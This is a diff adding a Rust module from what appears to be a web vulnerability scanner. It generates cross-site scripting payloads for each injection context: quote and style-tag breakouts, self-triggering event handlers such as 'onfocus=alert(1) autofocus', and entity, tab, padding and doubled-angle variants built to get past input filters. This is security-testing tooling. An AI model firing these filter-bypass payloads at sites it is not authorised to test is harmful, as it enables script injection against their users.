@@ -1,0 +1,599 @@
+use crate::cmd::scan::ScanArgs;
+
+use crate::parameter_analysis::{DelimiterType, InjectionContext};
+use std::collections::HashMap;
+use std::sync::{Mutex, OnceLock};
+
+// Context-specific payload lists
+
+static CUSTOM_PAYLOAD_CACHE: OnceLock<Mutex<HashMap<String, Vec<String>>>> = OnceLock::new();
+
+/// Per-context catalog cache. The generated catalog depends only on `context`
+/// and the process-stable scan markers (`OnceLock`s in `markers`), so the same
+/// context produces identical payloads for the whole process — yet
+/// `generate_dynamic_payloads` is called once or twice per reflecting param and
+/// per target, rebuilding hundreds of `format!`-allocated strings each time.
+/// Memoize the catalog keyed by the context's `Debug` repr (a stable, unique
+/// key that avoids requiring `Hash`/`Eq` on `InjectionContext`). Callers own and
+/// mutate the returned `Vec`, so we hand back a clone and the cache can't be
+/// corrupted.
+static DYNAMIC_PAYLOAD_CACHE: OnceLock<Mutex<HashMap<String, std::sync::Arc<Vec<String>>>>> =
+    OnceLock::new();
+
+/// Generate dynamic payloads based on the injection context (memoized).
+pub(crate) fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
+    let key = format!("{context:?}");
+    let cache = DYNAMIC_PAYLOAD_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
+    if let Ok(guard) = cache.lock()
+        && let Some(cached) = guard.get(&key)
+    {
+        return cached.as_ref().clone();
+    }
+    let payloads = std::sync::Arc::new(generate_dynamic_payloads_uncached(context));
+    if let Ok(mut guard) = cache.lock() {
+        guard.insert(key, std::sync::Arc::clone(&payloads));
+    }
+    payloads.as_ref().clone()
+}
+
+/// Build the per-context payload catalog from scratch. Wrapped by the memoizing
+/// [`generate_dynamic_payloads`].
+fn generate_dynamic_payloads_uncached(context: &InjectionContext) -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    match context {
+        InjectionContext::Attribute(delimiter_type)
+        | InjectionContext::AttributeUrl(delimiter_type) => {
+            let url_like = matches!(context, InjectionContext::AttributeUrl(_));
+            let html_payloads = crate::payload::get_dynamic_xss_html_payloads();
+            let attr_payloads = crate::payload::get_dynamic_xss_attribute_payloads();
+            let protocol_payloads = crate::payload::get_protocol_injection_payloads();
+            // Front-load the protocol/URL scheme family for *every* attribute
+            // context, not only `AttributeUrl`. The built-in per-parameter safety
+            // cap (issue #1155) truncates this catalog, and the html + attribute
+            // breakout block alone exceeds the 3000 default, so a scheme appended
+            // at the tail of the non-URL arms (below) was evicted before it could
+            // be tried — losing the only verifier for a `javascript:` sink the
+            // classifier did not tag as URL-valued (e.g. a `<meta http-equiv=
+            // refresh content="0;url=…">` reflected as a quoted attribute value).
+            // The downstream encoder pass de-duplicates, so the tail emissions
+            // that remain below are now no-ops. A scheme reflected in a genuinely
+            // non-URL attribute is demoted by the reflected-XSS report gate
+            // (`dangerous_scheme_reflection_is_inert`), so this adds no false
+            // positives.
+            payloads.extend(protocol_payloads.iter().cloned());
+            match delimiter_type {
+                Some(DelimiterType::SingleQuote) => {
+                    if url_like {
+                        payloads.extend(protocol_payloads.iter().cloned());
+                    }
+                    for payload in html_payloads.iter() {
+                        payloads.push(format!("'>{}'", payload));
+                    }
+                    // Self-triggering event handler payloads (work even when < > are filtered).
+                    // Carry the scan's id marker so a reflection in attribute context
+                    // promotes straight to V via marker-based DOM evidence — the first
+                    // hit collapses both the reflection and DOM verification loops
+                    // together. Ordered BEFORE `attr_payloads` (marker-less event
+                    // handlers) so the first angle-free payload sent is marker-
+                    // carrying — critical on servers that strip `<` / `>`, where
+                    // every prior payload that lacks a marker only yields [R] and
+                    // drains the DOM verification budget.
+                    let id_marker = crate::scanning::markers::id_marker();
+                    let autotrigger_events = [
+                        "onfocus=alert(1) autofocus",
+                        "onmouseover=alert(1)",
+                        "onfocus=alert(1) autofocus tabindex=0",
+                        "ontoggle=alert(1) popover",
+                        "onbeforeinput=alert(1) contenteditable",
+                        "onsecuritypolicyviolation=alert(1)",
+                        "onformdata=alert(1)",
+                        "onslotchange=alert(1)",
+                    ];
+                    for ev in &autotrigger_events {
+                        payloads.push(format!("' {} id={} '", ev, id_marker));
+                        // HTML Entity version of = inside attribute events
+                        let ev_entity = ev.replace("=", "&#61;");
+                        payloads.push(format!("' {} id={} '", ev_entity, id_marker));
+
+                        // Tab separator variant (bypasses space filtering)
+                        payloads.push(format!("'\t{}\tid={}\t'", ev, id_marker));
+                        payloads.push(format!("'\t{}\tid={}\t'", ev_entity, id_marker));
+                    }
+                    for payload in attr_payloads.iter() {
+                        payloads.push(format!("' {} a='", payload));
+                        let payload_entity = payload.replace("=", "&#61;");
+                        payloads.push(format!("' {} a='", payload_entity));
+                    }
+                    if !url_like {
+                        // Protocol payloads for src/href attributes (e.g. iframe src='VALUE')
+                        // These don't need quote breaking since the protocol URI itself executes
+                        for payload in protocol_payloads.iter() {
+                            payloads.push(payload.clone());
+                        }
+                    }
+                }
+                Some(DelimiterType::DoubleQuote) => {
+                    if url_like {
+                        payloads.extend(protocol_payloads.iter().cloned());
+                    }
+                    for payload in html_payloads.iter() {
+                        payloads.push(format!("\">{}\"", payload));
+                    }
+                    // Self-triggering event handler payloads (work even when < > are filtered).
+                    // Marker-carrying so the first reflecting payload also DOM-verifies
+                    // and the scanner short-circuits both loops in a single round-trip.
+                    // Ordered BEFORE `attr_payloads` so the first angle-free payload
+                    // sent is marker-carrying — see SingleQuote branch for full rationale.
+                    let id_marker = crate::scanning::markers::id_marker();
+                    let autotrigger_events = [
+                        "onfocus=alert(1) autofocus",
+                        "onmouseover=alert(1)",
+                        "onfocus=alert(1) autofocus tabindex=0",
+                        "ontoggle=alert(1) popover",
+                        "onbeforeinput=alert(1) contenteditable",
+                        "onsecuritypolicyviolation=alert(1)",
+                        "onformdata=alert(1)",
+                        "onslotchange=alert(1)",
+                    ];
+                    for ev in &autotrigger_events {
+                        payloads.push(format!("\" {} id={} \"", ev, id_marker));
+                        // HTML Entity version of = inside attribute events
+                        let ev_entity = ev.replace("=", "&#61;");
+                        payloads.push(format!("\" {} id={} \"", ev_entity, id_marker));
+
+                        // Tab separator variant (bypasses space filtering)
+                        payloads.push(format!("\"\t{}\tid={}\t\"", ev, id_marker));
+                        payloads.push(format!("\"\t{}\tid={}\t\"", ev_entity, id_marker));
+                    }
+                    for payload in attr_payloads.iter() {
+                        payloads.push(format!("\" {} \"", payload));
+                        let payload_entity = payload.replace("=", "&#61;");
+                        payloads.push(format!("\" {} \"", payload_entity));
+                    }
+                    if !url_like {
+                        // Protocol payloads for src/href attributes (e.g. iframe src="VALUE")
+                        for payload in protocol_payloads.iter() {
+                            payloads.push(payload.clone());
+                        }
+                    }
+                }
+                _ => {
+                    if url_like {
+                        payloads.extend(protocol_payloads.iter().cloned());
+                    }
+                    // Self-triggering event handlers carrying the scan's id
+                    // marker. Critical for the "attribute name slot"
+                    // position (`<div id='x' MARKER>`) — bare `onabort=…`
+                    // never fires on a static div, but `onfocus=alert(1)
+                    // autofocus tabindex=0` and `ontoggle=alert(1) popover`
+                    // make the element auto-focusable/auto-toggled so the
+                    // reflection promotes to V instead of stalling at R.
+                    // Listed BEFORE attr_payloads so the first marker-
+                    // carrying payload is also DOM-verifiable.
+                    let id_marker = crate::scanning::markers::id_marker();
+                    let autotrigger_events = [
+                        "onfocus=alert(1) autofocus",
+                        "onfocus=alert(1) autofocus tabindex=0",
+                        "ontoggle=alert(1) popover",
+                        "onbeforeinput=alert(1) contenteditable",
+                        "onsecuritypolicyviolation=alert(1)",
+                        "onformdata=alert(1)",
+                        "onslotchange=alert(1)",
+                    ];
+                    for ev in &autotrigger_events {
+                        payloads.push(format!("{} id={}", ev, id_marker));
+                        let ev_entity = ev.replace("=", "&#61;");
+                        payloads.push(format!("{} id={}", ev_entity, id_marker));
+                    }
+                    payloads.extend(html_payloads);
+                    payloads.extend(attr_payloads.clone());
+                    // Also include entity-encoded variants for general attribute events in unquoted context
+                    for payload in attr_payloads.iter() {
+                        let payload_entity = payload.replace("=", "&#61;");
+                        payloads.push(payload_entity);
+                    }
+                    if !url_like {
+                        // Protocol payloads for unquoted src/href attributes
+                        payloads.extend(protocol_payloads);
+                    }
+                }
+            }
+        }
+        InjectionContext::Javascript(delimiter_type) => match delimiter_type {
+            Some(DelimiterType::SingleQuote) => {
+                for &payload in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
+                    payloads.push(format!("'-{}-'", payload));
+                    payloads.push(format!("'+{}+'", payload));
+                }
+            }
+            Some(DelimiterType::DoubleQuote) => {
+                for &payload in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
+                    payloads.push(format!("\"-{}-\"", payload));
+                    payloads.push(format!("\"+{}+\"", payload));
+                }
+            }
+            Some(DelimiterType::Backtick) => {
+                // Template-literal context: `${expr}` evaluates the inner
+                // expression without needing to escape the surrounding `` ` ``.
+                // Also emit a backtick-break form for sinks that re-parse the
+                // string (e.g. eval(`…`)), and the </script> wrapper for the
+                // rare case the template literal is the script's only token.
+                for &payload in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
+                    payloads.push(format!("${{{}}}", payload));
+                    payloads.push(format!("`-{}-`", payload));
+                    payloads.push(format!("`+{}+`", payload));
+                }
+            }
+            Some(DelimiterType::Comment) => {
+                for &payload in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
+                    payloads.push(format!("*/{}/*", payload));
+                    payloads.push(format!("\n{}", payload));
+                }
+            }
+            _ => {
+                for &payload in crate::payload::XSS_JAVASCRIPT_PAYLOADS.iter() {
+                    // Base payload
+                    payloads.push(payload.to_string());
+                    // Augmented wrappers for broader execution contexts
+                    payloads.push(format!("</script><script>{}</script>", payload));
+                }
+            }
+        },
+        InjectionContext::Html(delimiter_type) => {
+            let html_payloads = crate::payload::get_dynamic_xss_html_payloads();
+            let mxss_payloads = crate::payload::get_mxss_payloads();
+            let clobbering_payloads = crate::payload::get_dom_clobbering_payloads();
+            // Short payloads without markers for truncated reflection contexts.
+            // These are intentionally compact (<30 chars) so they survive server-side
+            // length limits. They only yield [R] (reflected) findings, not [V].
+            let short_payloads: Vec<String> = vec![
+                "<svg/onload=alert(1)>".to_string(),
+                "<img src=x onerror=alert(1)>".to_string(),
+                "<svg onload=alert(1)>".to_string(),
+                "<details open ontoggle=alert(1)>".to_string(),
+            ];
+            match delimiter_type {
+                Some(DelimiterType::Comment) => {
+                    for payload in short_payloads
+                        .iter()
+                        .chain(html_payloads.iter())
+                        .chain(mxss_payloads.iter())
+                        .chain(clobbering_payloads.iter())
+                    {
+                        payloads.push(format!("-->{}<!--", payload));
+                        payloads.push(format!("--!>{}<!--", payload));
+                    }
+                }
+                _ => {
+                    payloads.extend(short_payloads);
+                    payloads.extend(html_payloads);
+                    payloads.extend(mxss_payloads);
+                    payloads.extend(clobbering_payloads);
+                }
+            }
+        }
+        InjectionContext::Css(delimiter_type) => {
+            // CSS injection: break out of <style> tag and inject HTML
+            let class_marker = crate::scanning::markers::class_marker();
+            let id_marker = crate::scanning::markers::id_marker();
+            let breakout_tags = vec![
+                format!("<IMG src=x onerror=alert(1) ClAss={}>", class_marker),
+                format!("<SVG onload=alert(1) ClAss={}>", class_marker),
+                format!("<SVG/onload=alert(1) id={}>", id_marker),
+                "<SCRIPT>alert(1)</SCRIPT>".to_string(),
+            ];
+            match delimiter_type {
+                Some(DelimiterType::SingleQuote) => {
+                    for tag in &breakout_tags {
+                        payloads.push(format!("');}}</style>{}", tag));
+                        payloads.push(format!("');}}</style>{}<!--", tag));
+                    }
+                }
+                Some(DelimiterType::DoubleQuote) => {
+                    for tag in &breakout_tags {
+                        payloads.push(format!("\");}}</style>{}", tag));
+                        payloads.push(format!("\");}}</style>{}<!--", tag));
+                    }
+                }
+                _ => {
+                    for tag in &breakout_tags {
+                        payloads.push(format!("</style>{}", tag));
+                        payloads.push(format!("}}</style>{}", tag));
+                        payloads.push(format!(";}}</style>{}", tag));
+                    }
+                }
+            }
+        }
+    }
+
+    payloads
+}
+
+/// Generate adaptive payloads using per-parameter analysis data (valid/invalid specials).
+/// When a parameter has analysis data, this applies targeted encoding to bypass filters.
+///
+/// `raw_only` (`--encoders none`) drops every encoded variant and keeps only the
+/// raw payloads, like `apply_encoders_to_payloads` does on the other DOM arms.
+pub(crate) fn generate_adaptive_payloads(
+    context: &InjectionContext,
+    invalid_specials: &[char],
+    valid_specials: &[char],
+    raw_only: bool,
+) -> Vec<String> {
+    let base_payloads = generate_dynamic_payloads(context);
+
+    // When angle brackets are blocked in an attribute context, prioritize event handler
+    // payloads and skip HTML tag payloads to reduce noise and focus on what works.
+    let angle_brackets_blocked = invalid_specials.contains(&'<') || invalid_specials.contains(&'>');
+
+    let mut filtered_payloads: Vec<String> = if angle_brackets_blocked {
+        match context {
+            InjectionContext::Attribute(_)
+            | InjectionContext::AttributeUrl(_)
+            | InjectionContext::Html(_) => base_payloads
+                .into_iter()
+                .filter(|p| !p.contains('<') && !p.contains('>'))
+                .collect(),
+            _ => base_payloads,
+        }
+    } else {
+        base_payloads
+    };
+
+    // When angle brackets are blocked, add marker-carrying event handler
+    // payloads for DOM verification without needing new HTML tags.
+    // These work in attribute context and also in HTML context when the
+    // value is additionally reflected in attributes (which context
+    // detection may miss).
+    // Use id marker to avoid duplicate-attribute rejection by HTML5
+    // parsers when the injection point is itself a class attribute.
+    if angle_brackets_blocked {
+        let add_attr_payloads = matches!(
+            context,
+            InjectionContext::Attribute(_)
+                | InjectionContext::AttributeUrl(_)
+                | InjectionContext::Html(_)
+        );
+        if add_attr_payloads {
+            let id_marker = crate::scanning::markers::id_marker();
+            let events = [
+                "onfocus=alert(1) autofocus",
+                "onmouseover=alert(1)",
+                "onfocus=alert(1) autofocus tabindex=0",
+                "ontoggle=alert(1) popover",
+                "onbeforeinput=alert(1) contenteditable",
+                "onsecuritypolicyviolation=alert(1)",
+                "onformdata=alert(1)",
+                "onslotchange=alert(1)",
+            ];
+            let delimiter = match context {
+                InjectionContext::Attribute(d) | InjectionContext::AttributeUrl(d) => d.clone(),
+                _ => None,
+            };
+            let (open_q, close_q) = match &delimiter {
+                Some(DelimiterType::SingleQuote) => ("'", "'"),
+                _ => ("\"", "\""),
+            };
+            for ev in &events {
+                filtered_payloads.push(format!("{} {} id={} {}", open_q, ev, id_marker, close_q));
+                // Tab separator variant for space-filtered contexts
+                filtered_payloads
+                    .push(format!("{}\t{}\tid={}\t{}", open_q, ev, id_marker, close_q));
+            }
+        }
+    }
+
+    // Issue #1075: filter-constrained generative synthesis. Build payloads from
+    // building blocks gated on exactly which characters this parameter's
+    // server-side filter reflects unchanged, and emit them *before* the broad
+    // catalog so the scan loop's first-hit-wins ordering tries the shapes most
+    // likely to execute against this specific filter first. Synthesized
+    // payloads only use surviving characters, so they are sent raw — encoding
+    // exists to smuggle *blocked* characters, which synthesis avoids by
+    // construction.
+    // Escaped-quote handling (#1072) is JS-string-context-only, and this path is
+    // reached for non-JS contexts (JS DOM payloads use the dedicated breakout
+    // set), so there is no escaped signal to thread here.
+    // This path serves non-JS DOM/attribute contexts; the observed-prefix JS
+    // breakout (#1073) is threaded through the reflection-phase synthesis call
+    // in `scanning::mod`, which has the carrying `Param`. No prefix here.
+    let synthesized = crate::payload::synthesis::synthesize_payloads(
+        context,
+        invalid_specials,
+        valid_specials,
+        &[],
+        None,
+    );
+
+    // Leading-window ("positional") filter bypass: some filters entity-encode /
+    // strip only a fixed leading window of the value, which the per-character
+    // probe cannot see (it reflects its `<` past the window and records it
+    // valid). These padded tag payloads push the real vector past that window;
+    // they carry raw `<`/`>` deliberately, so the caller's raw-angle prune
+    // exempts them via `synthesis::is_positional_pad_bypass`. FP-safe by marker
+    // verification. Placed AFTER `synthesized` (which leads with the clean tag
+    // shapes) so an easily-exploitable param still verifies on — and reports —
+    // the tidy PoC first; on an easy param the DOM phase stops at that `[V]` and
+    // these are never sent. Still well inside the DOM phase's 256-echo early-exit
+    // window, so they are reached when the clean tags are positionally filtered.
+    let positional = crate::payload::synthesis::positional_pad_payloads(context);
+
+    // Doubled-angle ("sub-not-gsub") filter bypass: a filter that strips /
+    // entity-encodes only the *first* `<` (a one-shot `str::replace`) makes the
+    // per-character probe record `<` blocked, so the clean tag shapes above are
+    // all pruned — yet doubling the angle (`<<svg …>>`) opens a real tag once
+    // the filter has spent its single pass. Carries raw `<`/`>` deliberately
+    // (exempted from the raw-angle prune via
+    // `synthesis::is_sub_filter_doubled_bypass`) and, like `positional`, is
+    // placed after the clean synthesized shapes so an easy param verifies the
+    // tidy PoC first and these are never sent. FP-safe by marker + sink
+    // co-survival: a global `<` strip collapses `<<` to inert text.
+    let doubled = crate::payload::synthesis::sub_filter_doubled_payloads(context);
+
+    // A full-entity variant is worth adding whenever anything is blocked.
+    let any_blocked = invalid_specials
+        .iter()
+        .any(|c| matches!(c, '<' | '>' | '"' | '\'' | '(' | ')'));
+    let estimated_cap =
+        (positional.len() + doubled.len() + synthesized.len() + filtered_payloads.len()) * 3;
+    let mut out = Vec::with_capacity(estimated_cap);
+    let mut seen = std::collections::HashSet::with_capacity(estimated_cap);
+    for p in synthesized {
+        if seen.insert(p.clone()) {
+            out.push(p);
+        }
+    }
+    for p in positional {
+        if seen.insert(p.clone()) {
+            out.push(p);
+        }
+    }
+    for p in doubled {
+        if seen.insert(p.clone()) {
+            out.push(p);
+        }
+    }
+    for p in &filtered_payloads {
+        // Original - insert reference to avoid clone when already seen
+        if seen.insert(p.clone()) {
+            out.push(p.clone());
+        }
+        if raw_only {
+            continue;
+        }
+        // Adaptive variants based on what's blocked, then the full-entity
+        // variant and the url baseline.
+        let mut variants = crate::encoding::apply_adaptive_encoding(p, invalid_specials);
+        if any_blocked {
+            variants.push(crate::encoding::html_entity_encode(p));
+        }
+        variants.push(crate::encoding::url_encode(p));
+        for v in variants {
+            if seen.insert(v.clone()) {
+                out.push(v);
+            }
+        }
+    }
+    out
+}
+
+pub(crate) fn load_custom_payloads(path: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
+    let cache = CUSTOM_PAYLOAD_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
+    if let Ok(guard) = cache.lock()
+        && let Some(cached) = guard.get(path)
+    {
+        return Ok(cached.clone());
+    }
+
+    // read_to_string already rejects non-UTF-8, but a missing/binary/empty
+    // file used to fall through to "no custom payloads" silently —
+    // `--only-custom-payload` then claimed it ran but actually scanned with
+    // zero payloads, or fell back to built-ins without warning. Surface
+    // *something* in every failure mode so operators can debug.
+    let content = crate::utils::fs::read_bounded(
+        std::path::Path::new(path),
+        crate::utils::fs::MAX_FILE_READ_BYTES,
+        "custom payload list",
+    )
+    .map_err(|e| {
+        format!(
+            "Cannot read --custom-payload {} (UTF-8 required): {}",
+            path, e
+        )
+    })?;
+    // Industry-standard list shape: skip blank and `#`-comment lines so
+    // users don't accidentally send `# comment` as a payload literal.
+    let payloads: Vec<String> = content
+        .lines()
+        .map(|l| l.trim_end_matches('\r')) // strip CR for CRLF files
+        .filter(|l| !l.is_empty() && !l.starts_with('#'))
+        .map(ToString::to_string)
+        .collect();
+
+    if payloads.is_empty() {
+        return Err(format!(
+            "--custom-payload {} contained no usable lines (empty after stripping blanks and # comments)",
+            path
+        )
+        .into());
+    }
+
+    if let Ok(mut guard) = cache.lock() {
+        guard.insert(path.to_string(), payloads.clone());
+    }
+
+    Ok(payloads)
+}
+
+pub(crate) fn get_dynamic_payloads(
+    context: &InjectionContext,
+    args: &ScanArgs,
+) -> Result<Vec<String>, Box<dyn std::error::Error>> {
+    let mut base_payloads = vec![];
+
+    if args.only_custom_payload {
+        if let Some(path) = &args.custom_payload {
+            base_payloads.extend(load_custom_payloads(path)?);
+        }
+    } else {
+        base_payloads.extend(generate_dynamic_payloads(context));
+        if let Some(path) = &args.custom_payload {
+            base_payloads.extend(load_custom_payloads(path)?);
+        }
+    }
+
+    // Include remote payloads, but only for a scan that actually asked for
+    // them, and only the list fetched for *this* scan's provider set. The cache
+    // is process-global, which is fine for the one-scan-per-process CLI and
+    // wrong for the long-lived server/MCP daemon: reading it unconditionally
+    // meant a job that requested **no** remote payloads still got whatever list
+    // some earlier job had fetched appended to every parameter's catalog —
+    // thousands of requests the submitter never asked for, against a target
+    // they had scoped deliberately. Keying the lookup by provider set closes
+    // the other half: a job asking for provider B no longer gets provider A's
+    // payloads just because A's job ran first.
+    if !args.remote_payloads.is_empty()
+        && let Some(remotes) = crate::payload::get_remote_payloads_for(&args.remote_payloads)
+        && !remotes.is_empty()
+    {
+        base_payloads.extend(remotes.iter().cloned());
+    }
+
+    // Apply custom alert value substitution (--custom-alert-value / --custom-alert-type)
+    let base_payloads = if args.custom_alert_value != "1" || args.custom_alert_type == "str" {
+        let val = if args.custom_alert_type == "str" {
+            format!("'{}'", args.custom_alert_value)
+        } else {
+            args.custom_alert_value.clone()
+        };
+        base_payloads
+            .into_iter()
+            .map(|p| {
+                p.replace("alert(1)", &format!("alert({})", val))
+                    .replace("confirm(1)", &format!("confirm({})", val))
+                    .replace("prompt(1)", &format!("prompt({})", val))
+                    .replace("alert`1`", &format!("alert`{}`", val))
+                    .replace("prompt`1`", &format!("prompt`{}`", val))
+                    .replace("confirm`1`", &format!("confirm`{}`", val))
+                    // Comma operator / indirect call patterns: (0,alert)(1)
+                    .replace(",alert)(1)", &format!(",alert)({})", val))
+                    .replace(",confirm)(1)", &format!(",confirm)({})", val))
+                    // Optional chaining: alert?.(1)
+                    .replace("alert?.(1)", &format!("alert?.({})", val))
+                    // Reflect.apply(alert,null,[1])
+                    .replace("alert,null,[1])", &format!("alert,null,[{}])", val))
+            })
+            .collect()
+    } else {
+        base_payloads
+    };
+
+    // Expand with shared encoder policy helper; handles "none" and deduplication
+    let payloads = crate::encoding::apply_encoders_to_payloads(&base_payloads, &args.encoders);
+
+    Ok(payloads)
+}
+
+#[cfg(test)]
+mod tests;
